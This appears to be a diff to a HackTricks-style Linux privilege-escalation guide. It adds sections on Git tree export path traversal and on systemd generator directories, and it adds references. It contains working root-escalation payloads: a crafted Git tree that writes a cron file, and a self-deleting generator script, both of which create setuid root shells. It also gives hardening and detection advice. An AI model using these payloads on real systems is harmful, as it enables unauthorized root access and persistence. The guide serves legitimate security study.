@@ -36,6 +36,40 @@ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod
 chmod +x pre-commit
 ```
 
+### Privileged Git tree export path traversal
+
+A privileged synchronizer may avoid a checkout and instead enumerate an attacker-influenced repository with `git ls-tree`, read each blob with `git cat-file`, join the reported pathname to a staging directory, and write it itself. This becomes an **arbitrary file write with the synchronizer's privileges** when it combines `-c safe.directory=*` (disabling Git's different-owner repository guard) with no destination containment check. An absolute tree-entry name makes Python's `os.path.join(stage, name)` discard `stage`; a relative name containing `../` escapes when the filesystem resolves it. Because the application materializes the raw tree rather than asking Git to check it out, checkout-time pathname rejection never protects the sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>
+
+Look for this code shape in root services, timers, deployment agents, template importers, and backup/restore jobs:<sup>[[30]](#references)</sup>
+
+```python
+entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
+for mode, oid, git_path in parse(entries):
+    target = os.path.join(stage_root, git_path)  # no containment check
+    os.makedirs(os.path.dirname(target), exist_ok=True)
+    with open(target, "wb") as output:
+        output.write(git("cat-file", "blob", oid))
+```
+
+A tree entry is encoded as `<mode> SP <name> NUL <raw object ID>`. The `git hash-object --literally` option deliberately permits object data that normal parsing or `git fsck` may reject, so a disposable clone can construct a tree whose filename is an absolute destination. This example creates a cron-file blob, wraps the crafted tree in a commit, and moves a branch to it; exploitation still requires permission to update a repository consumed by the privileged job and a Git server that accepts the malformed object.<sup>[[30]](#references)[[31]](#references)</sup>
+
+```bash
+blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
+{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
+tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
+commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
+git update-ref refs/heads/main "$commit"
+git ls-tree -r main
+git push --force origin main
+```
+
+Hardening must cover both repository ingestion and the final filesystem operation:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>
+
+- Replace `safe.directory=*` with the exact repositories the service must trust, and run repository processing without root privileges where possible.
+- Reject absolute names and any `.` or `..` component before materialization. After joining, canonicalize and verify that the destination remains beneath the intended root.
+- Avoid check-then-open symlink races: open relative to a trusted directory descriptor and, on Linux, use `openat2()` with `RESOLVE_BENEATH` plus `RESOLVE_NO_SYMLINKS` for attacker-controlled paths.
+- Prefer a normal checkout in an isolated directory over reimplementing checkout from plumbing output. If raw-object ingestion is required, enable receive-side validation such as `receive.fsckObjects=true`; do not downgrade the pathname-related `receive.fsck.*` findings needed to reject crafted trees.
+
 ### Cron & Time files
 
 If you can **write cron-related files that root executes**, you can usually get code execution the next time the job runs. Interesting targets include:<sup>[[14]](#references)[[20]](#references)</sup>
@@ -129,6 +163,42 @@ systemctl restart vulnerable.service
 ```
 
 If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.<sup>[[17]](#references)</sup>
+
+### systemd generator directories
+
+**System generators** are executables launched by the system manager before it loads unit files, both during boot and configuration reloads. Therefore, write access to a system-generator directory (or to an existing executable generator) is a direct root-code-execution primitive that is easy to miss when an audit checks only `*.service` and `*.timer` files.<sup>[[35]](#references)[[36]](#references)</sup>
+
+The usual search order is `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, and `/usr/lib/systemd/system-generators/` (some distributions expose `/lib/systemd/system-generators/` through the `/usr` merge). An executable with the same name in an earlier directory shadows the later one. Do not confuse these **input executable directories** with `/run/systemd/generator`, `/run/systemd/generator.early`, and `/run/systemd/generator.late`, which contain transient unit output produced by generators.<sup>[[35]](#references)</sup>
+
+Quick checks:
+
+```bash
+for d in /run/systemd/system-generators /etc/systemd/system-generators \
+         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
+         /lib/systemd/system-generators; do
+    [ -e "$d" ] || continue
+    namei -l "$d"
+    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
+    getfacl -p "$d" "$d"/* 2>/dev/null
+done
+```
+
+A newly created generator must have its executable bit set. If the write primitive controls bytes but not mode, target an already executable generator; truncating it in place normally preserves its metadata. If the directory itself is writable, create and mark a new entry executable.<sup>[[35]](#references)</sup>
+
+```bash
+cat > /etc/systemd/system-generators/zz-update <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chown 0:0 /tmp/rootbash
+chmod 4755 /tmp/rootbash
+rm -f "$0"
+EOF
+chmod 755 /etc/systemd/system-generators/zz-update
+```
+
+Triggering `systemctl daemon-reload` against the **system** manager requires suitable authorization, but it re-runs every system generator; otherwise wait for a privileged reload, package operation, or reboot. User-generator directories such as `~/.config/systemd/user-generators/` execute under the user manager and do **not** provide root by themselves.<sup>[[35]](#references)</sup>
+
+For hardening and hunting, verify every path component and ACL rather than only the final mode bits, baseline hashes/package ownership of generators, and alert on create, rename, content, or permission changes in all system-generator input directories. Monitoring the write is important because a one-shot generator can delete itself after execution, while the generated unit tree under `/run/systemd/generator*` is rebuilt on the next reload.<sup>[[35]](#references)[[36]](#references)</sup>
 
 ### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox
 
@@ -310,6 +380,8 @@ initcall_blacklist=algif_aead_init
 
 This kind of mitigation is worth remembering for other kernel LPEs too: if exploitation depends on a specific optional interface, disabling or blacklisting that interface can break the exploit path even before a full kernel upgrade is available.<sup>[[6]](#references)[[28]](#references)</sup>
 
+
+
 ## References
 
 - [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
@@ -341,5 +413,11 @@ This kind of mitigation is worth remembering for other kernel LPEs too: if explo
 - [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
 - [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
 - [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
-
+- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
+- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
+- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
+- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
+- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
+- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
+- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
 {{#include ../../banners/hacktricks-training.md}}
